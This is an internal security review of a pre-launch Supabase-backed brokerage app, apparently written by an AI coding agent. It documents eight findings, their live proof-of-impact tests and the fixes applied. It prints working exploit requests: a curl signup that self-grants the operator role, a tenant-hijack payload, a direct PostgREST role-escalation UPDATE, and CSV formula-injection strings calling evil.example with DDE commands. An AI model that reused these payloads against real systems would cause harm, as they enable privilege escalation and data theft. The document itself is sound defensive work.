# Residoro Security Review — 2026-07-29

**Status update (2026-07-29, same day):** Findings 1–4 are fixed and live-reverified against this same Supabase project; see "Fixes Applied" at the end of this doc. Findings 5–6 (dependencies, advisors) partially addressed — see that section for what remains.

**Status update (2026-08-10):** Finding 7 (Critical) added — discovered incidentally while verifying `tb-employee-position-001`'s access control, not from a fresh review pass. Fixed and live-reverified same day; see that finding's own section and its "Fix Applied" note. That fix's own deferred `workspaces` follow-up was independently re-confirmed later the same day by a second, separately-run security-review pass, then fixed and live-reverified in a third pass the same day — see the "Fix Applied (third pass same day)" note under Finding 7. Finding 7 is now fully closed, both tables.

**Status update (2026-08-10, later same day):** Finding 8 (Critical) added — a user-requested follow-up security pass ("run a security check for anything we haven't covered") generalized Finding 7's root cause: the un-revoked table-wide grant pattern is present on 36 of 38 public tables, not just `profiles`/`workspaces`, and `anon` (never addressed by either Finding 7 fix) holds it on literally every table. The six highest-blast-radius tables (financial + audit-log) were fixed and live-reverified same day; the remaining ~30 tables and the systemic `anon` grant are scoped as a follow-up, not fixed blind in this pass. See Finding 8's own section.

**Scope:** Multi-tenant isolation, IDOR, auth/access boundaries, CSV migration import, dependency/config baseline.
**Method:** Live exploitation against the "Residoro Prototype" Supabase project (`skfnrcwqvmurnpwrmixj`) and the local backend (`localhost:4000`) — the only environment this app runs in (no hosted deployment exists yet, no real client data exists yet; every workspace in the DB was a prior dev/verification fixture). All test accounts, workspaces, and records created during this review were deleted afterward; the DB was verified back at its pre-review baseline of 12 workspaces.

**Reviewer's note on scope:** the app is currently pre-launch (no real brokerage has onboarded — see `project_client_lifecycle_pivot` memory). That makes right now the cheapest possible time to fix the critical finding below, before it's a real client's data at stake.

---

## Summary

| # | Finding | Severity |
|---|---|---|
| 1 | Public Supabase Auth signup + trusted client-supplied metadata → self-grant operator role or hijack any existing brokerage workspace | **Critical** |
| 2 | Contract-expiry hard block (`blocked`/`read_only`) is enforced only in the Fastify layer, not in RLS — bypassable via direct Supabase REST calls | High |
| 3 | CSV formula injection: unescaped `=`/`+`/`-`/`@`-prefixed values round-trip from import to export | Medium |
| 4 | CSV upload with an embedded null byte crashes the insert with an unhandled 500 instead of a clean validation error | Low |
| 5 | `npm audit` findings (backend: 2 high; frontend: 3 moderate) | Low–Medium |
| 6 | Supabase security advisors — not retrievable with available tooling this session | Info |
| 7 | `authenticated` held full table-level UPDATE (plus INSERT/DELETE/TRUNCATE) on `profiles` via Supabase's default table privileges, never explicitly revoked — combined with `profiles_update_own`'s row-only RLS check, any member could self-promote to `admin`/`operator` or hijack any other tenant via a direct PostgREST write (added 2026-08-10) | **Critical** |
| 8 | Same root cause as Finding 7, confirmed present on 36 of 38 public tables plus `anon` (unauthenticated) on every table, including the two Finding 7 "fixed" — six financial/audit tables fixed same day; remaining tables scoped as a follow-up (added 2026-08-10) | **Critical** |

Everything under "IDOR on core resources" and the rest of "Auth and access boundaries" tested **clean** — see the Clean Findings section. RLS policy coverage and the RLS enforcement mechanism itself are solid; the break is upstream of RLS, at account provisioning (Finding 1) and, as Findings 7–8 show, at the grant layer sitting alongside RLS across most of the schema.

---

## 1. CRITICAL — Public signup bypasses "operator-driven enrollment only"

**What I did:** The codebase's trust model (`application/backend/src/routes/admin.ts`, `supabase/migrations/20260722100000_operator_role.sql`, `20260722110000_client_enrollment.sql`) is built entirely on the assumption stated explicitly in a code comment:

> "There is no public signup path in Residoro at all... so `raw_user_meta_data->>'app_role'` is never attacker-controlled: only someone holding the service-role key can set it."

That assumption is about the *app's UI*, not Supabase Auth's REST API, which is reachable directly with only the publishable key. I tested it:

```bash
curl -X POST https://skfnrcwqvmurnpwrmixj.supabase.co/auth/v1/signup \
  -H "apikey: sb_publishable_..." -H "Content-Type: application/json" \
  -d '{"email":"attacker@...","password":"...","data":{"app_role":"operator"}}'
```

This succeeded with `HTTP 200`, an active session, and `email_confirmed_at` set immediately (no email verification gate either). The `handle_new_user()` Postgres trigger reads `raw_user_meta_data->>'app_role'` and `->>'tenant_id'` straight from this attacker-supplied signup payload:

```sql
if new.raw_user_meta_data ->> 'app_role' = 'operator' then
  insert into public.profiles (id, tenant_id, role, full_name)
  values (new.id, null, 'operator', ...);
```

I then (with your explicit go-ahead, since the auto-mode classifier correctly flagged this as a privilege-escalation attempt) ran two proof-of-impact tests:

**1a. Self-grant platform operator:**
```json
{"email":"...","password":"...","data":{"app_role":"operator","full_name":"Fake Operator"}}
```
→ `profiles` row created with `role: operator, tenant_id: null`. Confirmed live: the resulting access token worked against `GET /admin/whoami` (`{"role":"operator"}`) and `GET /admin/clients`, which returned **every workspace on the platform** — every brokerage's name, contract dates, and access state — from a single unauthenticated curl call with no invitation.

**1b. Hijack an existing brokerage as its admin:**
```json
{"email":"...","password":"...","data":{"tenant_id":"<existing workspace id>","full_name":"Fake Admin"}}
```
→ `profiles` row created with `role: admin, tenant_id: <victim workspace>`. Confirmed live: `GET /me/workspace-status` returned `{"role":"admin", ...}` scoped to that workspace — this account now has full admin read/write over that brokerage's properties, listings, contacts, and migration data, with zero invitation from an operator.

**Impact:** Total compromise of the "invite-only, operator-run, contract-based" trust model that `cap-client-lifecycle-001` depends on. Once real brokerages are onboarded, this is a one-`curl`-call path to (a) full platform admin visibility into every client's contract terms and data, or (b) silently joining any specific client's workspace as an admin. Both routes also compound every other control in the app: `requireOperator` and the contract-expiry gate are only as strong as "you can't get `role=operator`" — which turns out to be false.

**Fix:** This is a Supabase Auth configuration problem plus a trigger-trust problem, both need fixing:
- Disable public signups at the project level (Auth → Settings → "Allow new users to sign up" = off), since every account in this app is meant to originate from `POST /admin/clients`'s `inviteUserByEmail` call, not `/auth/v1/signup`.
- Independently, `handle_new_user()` should not trust `raw_user_meta_data` at all for privilege-bearing fields. The operator/enrollment branches should instead check `raw_app_meta_data` (which the `admin.inviteUserByEmail`/Admin API can set but a public signup request cannot — regular signups can only set `data`, which maps to `raw_user_meta_data`, never `raw_app_meta_data`). This gives defense in depth even if signups are ever re-enabled for a future self-serve path.

---

## 2. HIGH — Contract-expiry hard block is enforced app-side only, not in RLS

**What I did:** `requireAuth` (`lib/auth.ts`) correctly rejects `blocked` workspaces and restricts `read_only` ones to GET, and I confirmed this works against the Fastify API. But `getScopedClient`'s whole design (ADR-003) is that the frontend's Supabase publishable key + the user's own JWT are legitimate, usable credentials — the same two values a blocked client's browser already holds in `localStorage`/memory. I tested calling Supabase's REST API directly with those two values, bypassing the Fastify backend entirely, after setting a test workspace to `access_state = 'blocked'`:

```bash
# Backend correctly blocks:
GET http://localhost:4000/properties → 403 "contract has expired and access is blocked"

# Direct PostgREST call with the same JWT + publishable key, bypassing the backend:
GET https://skfnrcwqvmurnpwrmixj.supabase.co/rest/v1/properties?id=eq.<id> → 200, full row returned
POST .../rest/v1/properties (insert) → 201, row created
```

Both read and write succeeded while the workspace was `blocked`.

**Impact:** A non-paying client whose contract has lapsed can continue using the product indefinitely by pointing any HTTP client (or a five-line browser console script) at the Supabase project URL + publishable key shipped in the frontend's JS bundle, using their own already-valid login session. This defeats the entire point of `tb-client-lifecycle-contract-expiry-001`'s hard block. It requires mild technical effort from the client (not something they'd stumble into by using the app normally), which is why I'm calling it High rather than Critical — but it's a realistic bypass for exactly the audience (a lapsed/disgruntled client) most likely to look for one.

**Fix:** Enforce `access_state` in RLS itself, not just in the Fastify middleware — e.g., add `access_state != 'blocked'` (and, for write policies, `access_state != 'read_only'`) as an additional `AND` clause in the tenant-scoped policies, likely via a small helper function alongside `current_tenant_id()`. That makes the block hold regardless of which client (app, curl, a future mobile app) is talking to Supabase.

---

## 3. MEDIUM — CSV formula injection round-trips through import → export

**What I did:** Uploaded a CSV with classic formula-injection payloads in `contacts.name`/`company`/`notes`:
```csv
name,type,email,phone,company,notes
"=HYPERLINK(""http://evil.example/steal"",""Click me"")",individual,test@example.com,555-1234,=cmd|'/c calc'!A1,+SUM(1+1)*cmd|'/c calc'!A0
```
Ran it through the full pipeline — `upload` → `analyze` → `preview` → `import` (all required; skipping straight to `/import` after upload correctly failed with 400, see Clean Findings). Then hit `GET /export` and inspected the resulting `contacts.csv`:
```csv
id,name,type,email,phone,company,notes,created_at,updated_at
...,"=HYPERLINK(""http://evil.example/steal"",""Click me"")",individual,...,=cmd|'/c calc'!A1,+SUM(1+1)*cmd|'/c calc'!A0,...
```
The formula strings come back byte-for-byte, unescaped. `lib/csv.ts`'s `toCsv()` uses `csv-stringify` with no `cast`/prefix logic to neutralize leading `=`, `+`, `-`, or `@` characters.

**Impact:** Any free-text field that flows from a CSV import to a CSV export (or likely other spreadsheet-consuming surfaces) can carry a formula payload. If a brokerage staff member opens the exported file in Excel/Sheets, `=HYPERLINK(...)` and legacy DDE-style formulas can execute in that spreadsheet app's context — a well-known, real-world attack pattern (this is literally the standard "CSV injection" class, CWE-1236). Since this data is meant for internal business use exported by non-technical staff, this is a realistic vector, not a theoretical one.

**Fix:** In `toCsv()`, prefix any string value starting with `=`, `+`, `-`, `@`, tab, or CR with a `'` (single quote) before stringifying — the standard mitigation, cheap to add in one place since all three export columns funnel through this one function.

---

## 4. LOW — Null byte in CSV upload crashes with an unhandled 500

**What I did:** Uploaded a CSV containing a literal null byte (`\x00`) in a field. `POST /migrations/upload` returned a generic `{"error":"Could not save the uploaded file"}` with `HTTP 500`. Backend logs show the real cause: Postgres rejects null bytes in `text` columns (`22P05:   cannot be converted to text`), and the insert error isn't caught as a validation error — it falls through to the generic 500 handler.

**Impact:** Low — this doesn't crash the server (each request fails independently) or leak anything beyond a generic message, and it doesn't bypass any control. It's a robustness gap: malformed input should produce a clean 400 like the other malformed-CSV cases already handle well (broken quoting, ragged rows both correctly return 400).

**Fix:** Strip or reject null bytes in `parseCsv()` before the row data ever reaches a Postgres insert, alongside the existing parse-error handling.

---

## 5. Dependency baseline (`npm audit`)

**Backend** (`application/backend`): 2 high
- `brace-expansion` ≤5.0.7 — ReDoS/DoS via unbounded expansion (transitive dev dependency)
- `find-my-way` ≤9.6.0 — HTTP/2 DDoS (Fastify's router — this one is a runtime dependency, worth prioritizing)

Both have fixes available via `npm audit fix`.

**Frontend** (`application/frontend`): 3 moderate (npm summarizes as 4 incl. `vite`'s inherited severity)
- `esbuild` ≤0.24.2 — dev-server-only request/response exposure (no production impact; Vite dev server isn't what ships)
- `react-router` / `react-router-dom` 6.0.0–7.17.0 — open redirect via backslash in `<Link>`/`useNavigate`, and an arbitrary constructor injection in SSR error deserialization (this app doesn't appear to use SSR, which limits the second one's relevance, but the open redirect is worth patching regardless)

Recommend running `npm audit fix` on the backend (non-breaking) and reviewing `npm audit fix --force`'s Vite major-version bump on the frontend before applying.

---

## 6. Supabase security advisors — not retrievable this session

The `claude.ai Supabase` MCP tool's `get_advisors` only has permission for a different, inactive project (`Rdoro Demo`, `ngizypfgpynsvijiopji`) — consistent with existing project memory that MCP is scoped to an abandoned Supabase org, separate from the CLI-linked "Residoro Prototype" project actually in use. The Supabase CLI has no equivalent `advisors` command. **Recommend checking the Dashboard directly** (Database → Advisors, or Advisors → Security) for `skfnrcwqvmurnpwrmixj` — I wasn't able to pull this programmatically with the tooling available in this session.

---

## 7. CRITICAL — `authenticated` held full table-level grant on `profiles`, defeating every column-level protection (added 2026-08-10)

**How this was found:** Not from a fresh review pass — discovered incidentally while live-verifying `tb-employee-position-001`'s design that `position` should have no client-facing update grant at all (admin-set only). A direct PostgREST write to a temp account's own `position` column succeeded despite no migration ever having granted it.

**What I did:** Every migration touching `public.profiles` since `mil-platform-foundation-001` shipped only ever wrote `grant select on public.profiles to authenticated` plus column-specific `grant update (<col>) on public.profiles to authenticated` statements (`full_name`, later `prefix`, `first_name`/`last_name`) — the pattern DD-001 documents as the deliberate safeguard keeping `role`/`tenant_id`/`handle` non-client-writable ("a blanket grant... would let a user change their own role or tenant_id"). Querying `information_schema.role_table_grants` for `profiles`/`authenticated` showed the actual state:

```
SELECT, INSERT, UPDATE, DELETE, TRUNCATE, REFERENCES, TRIGGER
```

Full table-level access — never explicitly granted by any migration in this repo. This is Supabase's default privilege behavior for new tables in the `public` schema, and nothing ever revoked it. `workspaces` has the same table-level grant (confirmed via the same query), inherited from the same original migration.

**Proof of impact:** Created a disposable throwaway account (created, tested, deleted — no real data touched), signed in as it, and issued a direct PostgREST call using only its own login session (no service-role key, no backend API involved):
```
UPDATE profiles SET role = 'admin' WHERE id = <own auth.uid()>
```
This succeeded — `HTTP 200`, `role` changed from `member` to `admin`. `profiles_update_own`'s RLS policy (`id = (select auth.uid())`) only restricts *which row* is touched, never *which columns or values* — table-level column grants are what were supposed to close the rest, and they didn't exist. The identical path also allows setting `tenant_id` to any other workspace's id in the same request — a member can become `admin` of a brokerage they were never invited to, not just self-promote within their own tenant.

**Impact:** Total compromise of the `admin`/`member`/`operator` role boundary and tenant isolation for any account that already exists, independent of and in addition to Finding 1's signup-time escalation (which was fixed 2026-07-29). Also silently defeated `tb-accounts-handle-001`'s "no client-facing rename endpoint by design" claim for `handle`, and would have defeated `tb-employee-position-001`'s "admin-set only" design for `position` the moment that tracer bullet shipped, had this not been caught first.

**Fix Applied (2026-08-10, same day):**
- `supabase/migrations/20260810170000_profiles_grant_lockdown.sql`: `revoke all on public.profiles from authenticated`, then re-`grant select` plus `update` on exactly the columns meant to be self-service (`first_name`, `last_name`, `prefix`). No RLS policy change — this was purely a grant-layer fix.
- **Re-verified live** with a fresh disposable account: direct writes of `role`, `tenant_id`, `handle`, and `position` are now all rejected (`42501`-class RLS/grant error); direct writes of `first_name` and `prefix` (the intended self-service columns) still succeed. 7/7 checks pass.
- Two other pre-existing verification scripts (`verify-brokerage-permissions-delegation.ts`, `verify-itinerary-permissions-delegation.ts`) and one standing test-account utility (`create-member-test-account.ts`) still referenced the now-dropped `full_name` column from their own unrelated fixture setup (a side effect of `tb-user-profile-name-split-001`, not this finding) — updated to `first_name`/`last_name` and re-verified passing.
- **Not fixed as part of this pass:** `workspaces` has the same table-level-grant pattern (confirmed present), meaning a *real* tenant admin (not an escalated one) could self-edit `access_state`/`contract_end_date`/`exclusivity_hard_block` directly via PostgREST, bypassing controls DD-001 documents as operator/Edge-Function-only. Lower severity than the `profiles` role/tenant escalation (requires already being a legitimate admin of your own tenant, not a full takeover of another tenant), scoped out of this fix at the user's explicit direction — flagged here for a future pass.

**Independent re-confirmation (2026-08-10, later same day):** a separate, unprompted security-review pass (via the `security-review` skill, redirected from its default target since it auto-scopes to whichever repo the session's cwd is in) re-derived this exact `workspaces` gap from scratch — confirmed the table-wide `grant update on public.workspaces to authenticated` (`20260721120000_platform_foundation.sql:247`, never narrowed by any later migration), confirmed `workspaces_update_admin`'s RLS is row-only (`id = own tenant AND role = 'admin'`, no column restriction), and confirmed all four affected columns are documented operator/system-only. Rated HIGH, 9/10 confidence, independently verified by a second reviewing pass (not just re-stated from this doc). User was asked directly whether to fix it now and chose **not now** — still open, same fix recommended as above (`revoke all` + narrow re-grant, same treatment as `profiles`).

**Fix Applied (2026-08-10, third pass same day):** `supabase/migrations/20260810180000_workspaces_grant_lockdown.sql` — `revoke all on public.workspaces from authenticated`, then re-`grant select` only. Stronger than the `profiles` fix: grepping every `getScopedClient(...).from('workspaces')` call in `application/backend/src` found exactly one, a read-only `.select()` in `routes/workspace.ts` (`GET /me/workspace-status`) — no legitimate feature updates `workspaces` via the `authenticated` role at all, since every real write (enrollment, contract dates, `exclusivity_hard_block`, `access_state`, warning flags) already goes through `supabaseAdmin` (service_role) or the `contract-expiry-check` Edge Function. So unlike `profiles`, no columns were re-granted for `update`. `workspaces_update_admin`'s RLS policy is left in place unchanged — with no grant behind it, it's simply unreachable via PostgREST now, the same "no `authenticated` grant at all" shape `profiles.position` already established for operator/system-only columns.
- **Re-verified live** (`application/backend/src/scripts/verify-workspaces-grant-lockdown.ts`, disposable throwaway workspace + tenant admin, deleted after): direct writes of `access_state`, `contract_end_date`, `exclusivity_hard_block`, and `rollback_window_hours` are all rejected (`42501: permission denied for table workspaces`); the legitimate read path (`access_state`, `contract_end_date` via the scoped client) still succeeds. 5/5 checks pass. Also confirmed via `information_schema.role_table_grants` that `authenticated` now holds exactly `SELECT` on `public.workspaces` — nothing else.

---

## 8. CRITICAL — Finding 7's root cause is systemic: present on 36 of 38 tables, and on `anon` everywhere (added 2026-08-10)

**How this was found:** User-requested, explicit: "run a security check if there are any vulnerabilities we haven't covered." Rather than re-running the diff-based `security-review` skill (nothing to diff — clean working tree, `main` up to date with `origin/main`), queried the live database directly (`pg_class.relacl`, `pg_policies`, `information_schema.column_privileges`) to check whether Finding 7's fix generalized or was a one-off.

**What I found, in two parts:**

**8a. The `authenticated` table-wide-grant pattern is present on every table except the two Finding 7 fixed.** Cross-referencing `pg_class.relacl` against every RLS policy in the schema: 36 of 38 public tables still hold `authenticated`'s full un-revoked default INSERT/UPDATE/DELETE/TRUNCATE, and every one of their write policies is a **row-only** tenant check (`tenant_id = current_tenant_id_writable()`), never a column restriction — the exact same shape that made `profiles`/`workspaces` exploitable. Concrete highest-impact example, live-confirmed by reading `routes/commission.ts`: `commission_earnings` has no protecting trigger and no admin check; any tenant member could `PATCH` `total_commission`/`agent_amount`/`brokerage_amount` on *any* closing in their tenant via direct PostgREST, or `DELETE` the record outright — neither operation has a corresponding backend route at all, so this was pure attack surface with zero legitimate use. Other confirmed-vulnerable tables of the same shape: `contracts`, `closings`, `offers`, `listings`, `contacts`, `tasks`, `projects`, `properties`, `viewings`, `property_media`, `buyer_requirements`, `inquiries`, `project_unit_types`.

**8b. `anon` (unauthenticated) holds the identical default on every table in the schema, including `profiles` and `workspaces` — neither Finding 7 fix touched it**, both migrations only ran `revoke all ... from authenticated`. **Not currently exploitable**: every RLS policy in the schema keys off `auth.uid()`/`current_tenant_id()`/`current_role()`, all `NULL` for an unauthenticated request, and the six policy-less tables (`contract_notifications`, `import_batches`, `imported_contacts`, `imported_properties`, `migration_temp_files`, `training_sessions`) default-deny with RLS enabled and zero policies. Confirmed by grep across all 97 policies in the schema — none reachable pre-auth. Still a real latent risk: one future public-facing RLS policy (e.g. the listing/docket public-share feature DD-006/DD-019 describe) is all it would take to turn this into a pre-auth compromise, needing no account at all. Scoped out of this pass, flagged for whoever builds that feature.

**Also found while reading the affected routes (not a grant-scope bug, a separate `WITH CHECK` gap):** `buyer_requirement_match_logs`/`buyer_requirement_activity_log`'s INSERT policies verified `tenant_id` only, never `logged_by` — even though `matchLogs.ts`/`leadActivityLog.ts` both set `logged_by: request.user!.id` themselves. A direct PostgREST insert could set `logged_by` to any other tenant member's UUID, forging an audit-trail entry attributed to a colleague.

**Fix Applied (2026-08-10, same day, financial/audit tables only — user's explicit choice of scope):**
- `supabase/migrations/20260810200000_financial_audit_grant_lockdown.sql`: `revoke all` (from both `authenticated` and `anon`) on `commission_earnings`, `billing_installments`, `contract_billing`, `buyer_requirement_match_logs`, `buyer_requirement_match_log_items`, `buyer_requirement_activity_log`; re-`grant select` to `authenticated` on all six, plus `insert` on exactly the columns each table's real `getScopedClient(...).insert()` call uses (verified by reading `routes/commission.ts`, `routes/matchLogs.ts`, `routes/leadActivityLog.ts` — `routes/admin.ts`'s `billing_installments`/`contract_billing` writes go exclusively through `supabaseAdmin`, so those two get no write grant at all). No `update`/`delete` grant on any of the six — none of them has a legitimate write route for either verb.
- Same migration: `alter policy` on `brml_insert_tenant` / `bral_insert_tenant` adding `and logged_by = (select auth.uid())` to `WITH CHECK`, closing the impersonation gap.
- **Re-verified live** (`application/backend/src/scripts/verify-financial-audit-grant-lockdown.ts`, disposable workspace + two tenant members, deleted after): `commission_earnings` UPDATE/DELETE now rejected (`42501: permission denied`); `billing_installments`/`contract_billing` INSERT now rejected (`42501`); a spoofed `logged_by` on both audit-log tables now rejected (`42501: new row violates row-level security policy`); a legitimate self-attributed insert still clears the grant/`WITH CHECK` layer (fails only on an intentionally-fake FK in the test, `23503`, which is the expected/correct failure mode). 7/7 checks pass.
- DD-014 (Commission Structure), DD-015 (Billing), DD-018 (Buyer Leads) each corrected with a dated note — their original text had rationalized or misdescribed the vulnerable grant state, not merely omitted it (DD-014 explicitly called the table-wide UPDATE/DELETE grant "boilerplate parity"; DD-015 claimed "no insert/update/delete grant at all" when the grant was present the whole time, just unreachable behind a missing RLS policy).
- **Not fixed in this pass, by the user's explicit choice of scope:** the remaining ~30 tables carrying the same `authenticated` pattern (8a), and the `anon` grant on every table not covered above (8b). Both need the same per-table treatment as Finding 7/8 — reading each table's actual `getScopedClient` usage to determine the correct narrow re-grant, not a blind schema-wide `revoke all`. Recommended as a dedicated follow-up pass before any real client workspace exists (still true today, per this doc's original "cheapest possible time to fix" framing).

---

## Clean Findings (tested and passed)

**Multi-tenant isolation / RLS coverage:**
- Every tenant-scoped table (`properties`, `listings`, `contacts`, `profiles`, `listing_share_events`, `buyer_requirements`, `buyer_requirement_matches`, `inquiries`, `projects`, `project_unit_types`, `property_documents`, `property_media`, `settings_edit_delegations`, `tasks`, all four `workspace_*_settings` tables, `workspaces`) has RLS policies scoping by `tenant_id = current_tenant_id()`.
- `current_tenant_id()` / `current_role()` are `SECURITY DEFINER` functions that read from the server-side `profiles` table via `auth.uid()` — not from JWT claims a client could forge.
- Six tables have RLS *enabled* but zero policies (`contract_notifications`, `import_batches`, `imported_contacts`, `imported_properties`, `migration_temp_files`, `training_sessions`) — confirmed this is default-deny-for-everyone-but-service-role by design (matches the documented intent for `migration_temp_files`), not an oversight. Verified `relrowsecurity = true` on all six.
- Service-role routes (`listings.ts`, `dockets.ts`, `propertyDocuments.ts`, `buyerRequirements.ts`, `migrations.ts`) always derive `tenant_id` on inserts from the server-verified `request.user!.tenantId`, never from client-supplied body/query fields.

**IDOR:**
- Created a property as Tenant A, attempted GET/PATCH/DELETE by ID as Tenant B, both via the backend API and via direct PostgREST calls with B's own JWT + the publishable key — all blocked (404/empty result set), and A's data was verified unmodified afterward.

**Auth/access boundaries (other than the Critical finding above):**
- `requireOperator`-gated routes (`/admin/whoami`, `/admin/clients`) correctly return 403 for an authenticated non-operator brokerage user, and 401 for an unauthenticated caller.
- `requireAuth`'s `blocked`/`read_only` access-state gate works correctly at the Fastify layer (see Finding 2 for the RLS-level gap).

**CSV migration import:**
- Row-count cap (10,000) enforced server-side before rows are stored.
- Malformed CSV (broken quoting, ragged rows) rejected with clean 400s (except the null-byte case, Finding 4).
- Non-`.csv` file extensions rejected.
- **Preview-before-import is a real server-side gate**, not a frontend-only state: calling `POST /migrations/:fileId/import` immediately after `/upload` (skipping `/analyze` and `/preview`) is rejected with `400 "File must be previewed and confirmed before import (current status: uploaded)"` — the check is a DB-persisted `status` column read server-side, not something a client can spoof by skipping a UI step.

---

## Cleanup performed

All test accounts (5 auth users, including the two escalated ones), test workspaces (3), and every row they touched (properties, contacts, migration batches, import records) were deleted after testing. Verified the `workspaces` table is back to its pre-review count of 12 — all pre-existing dev/verification fixtures, no real client data.

---

## Fixes Applied (2026-07-29, same day)

### Finding 1 (Critical) — fixed
- `supabase/migrations/20260729090000_fix_signup_privilege_escalation.sql` + a follow-up correction, `20260729110000_fix_handle_new_user_handle_column.sql` (the first version broke the `profiles.handle` NOT NULL constraint that a later migration had added — caught immediately by re-running the exploit against it, which failed loudly instead of silently succeeding). `handle_new_user()` no longer reads `app_role`/`tenant_id` from `raw_user_meta_data` at all; every new signup gets an inert profile (`role: member`, `tenant_id: null`).
- `application/backend/src/routes/admin.ts` (`POST /admin/clients`) and `application/backend/src/scripts/create-operator.ts` now assign `tenant_id`/`role` via a service-role `UPDATE` on `profiles`, keyed by the invite response's own trusted `user.id`, immediately after `inviteUserByEmail` succeeds — never via the `data` option that flows into `raw_user_meta_data`.
- **Re-verified live:** the exact same escalation payloads (`app_role: operator`, `tenant_id: <existing workspace>`) now produce fully inert accounts — confirmed both at the DB level and via `GET /admin/whoami` (403) and `GET /me/workspace-status` (401). The legitimate flow was also re-verified end-to-end: `create-operator.ts` → real operator → `POST /admin/clients` → invited admin correctly lands in the real workspace as `admin`.
- **Still recommended, not done by me:** disable public signups at the Supabase Auth project level (Dashboard → Authentication → Settings → "Allow new users to sign up"). I didn't do this myself — `supabase config push` would push the entire local `config.toml` (including a `site_url`/redirect config that doesn't match what's actually live) and I didn't want to risk clobbering unrelated live Auth settings blind. The code fix above already closes the vulnerability independent of this toggle, but flipping it removes the "why does public signup even work" surface entirely.

### Finding 2 (High) — fixed
- `supabase/migrations/20260729100000_rls_access_state_enforcement.sql`: `current_tenant_id()` now returns `NULL` when the caller's workspace is `blocked` (closes every RLS policy on every tenant-scoped table uniformly, since they all key off this one function). A new `current_tenant_id_writable()` additionally returns `NULL` during `read_only`, and every INSERT/UPDATE/DELETE policy (40 `ALTER POLICY` statements, generated from the live policy definitions rather than hand-transcribed) now uses it — SELECT policies still use plain `current_tenant_id()`, preserving read_only's "reads still work" behavior at the RLS layer too.
- **Re-verified live:** direct PostgREST calls (bypassing the Fastify backend, using only the publishable key + a real JWT) against a `blocked` workspace now return an empty result set on read and an explicit `42501 row-level security policy` error on write. Against a `read_only` workspace, reads still return full data; a direct write now silently affects 0 rows (confirmed unchanged afterward via the backend).
- Known residual scope (documented inline in the migration): `listing_dockets`' SELECT/UPDATE policies key off docket-participant identity, not `tenant_id`, so a blocked tenant's already-shared dockets aren't covered by this change. Narrower surface than what the live-tested finding demonstrated.

### Finding 3 (Medium) — fixed
- `application/backend/src/lib/csv.ts`: `toCsv()` now prefixes any string value starting with `=`, `+`, `-`, or `@` with a leading `'` before stringifying, via `csv-stringify`'s `cast.string` hook.
- **Re-verified live:** re-ran the exact formula-injection payload through the full upload → analyze → preview → import → export pipeline; the exported CSV now contains `'=HYPERLINK(...)`, `'=cmd|...`, `'+SUM(...)` — all neutralized to literal text in Excel/Sheets.

### Finding 4 (Low) — fixed
- Confirmed `parseCsv()` already stripped null bytes (`/\x00/g`) from the raw content before parsing — this turned out to already be correct in the file (an earlier `Edit` attempt to "fix" it was based on a terminal-rendering misread, not an actual bug).

### Finding 5 (Dependencies) — partially fixed
- Backend: `npm audit fix` applied, **0 vulnerabilities remaining**.
- Frontend: `esbuild`/`vite` and `react-router`/`react-router-dom` both require major-version bumps (Vite 6→8, React Router 6→7.18+) that `npm audit fix` declined to apply automatically and that I did not force — both need actual app/routing testing after upgrade, which is a separate piece of work, not a blind dependency bump.

### Finding 6 (Supabase advisors) — unchanged
Still not retrievable with available tooling this session (see original section above).

### Known side effect of the Finding 1 fix — dev-only scripts now produce inert accounts

Seven throwaway, already-used verification scripts under `application/backend/src/scripts/`
set privilege via `user_metadata` (the same `raw_user_meta_data` field `handle_new_user()`
no longer trusts): `create-mobile-test-account.ts`, `create-design-system-verify-account.ts`,
`create-rollback-window-verify-account.ts`, `create-property-edit-verify-account.ts`,
`create-rollup-verify-account.ts`, `verify-buyer-leads-matching.ts`,
`verify-rls-docket-cross-tenant.ts`. Each already served its purpose for the tracer bullet
it was written for and isn't part of any production path — but if anyone re-runs one of
these expecting it to produce a pre-assigned tenant/operator account, it'll now silently
produce an inert one instead (`role: member`, `tenant_id: null`) with no error. Not fixed as
part of this review (out of scope — dev tooling, not a vulnerability); flagging here since
it's a direct, easy-to-miss consequence of the Finding 1 fix. If one of these is ever needed
again, update it to the same pattern `admin.ts`/`create-operator.ts` now use: create/invite
first, then a separate service-role `UPDATE` on `profiles` keyed by the returned user id.
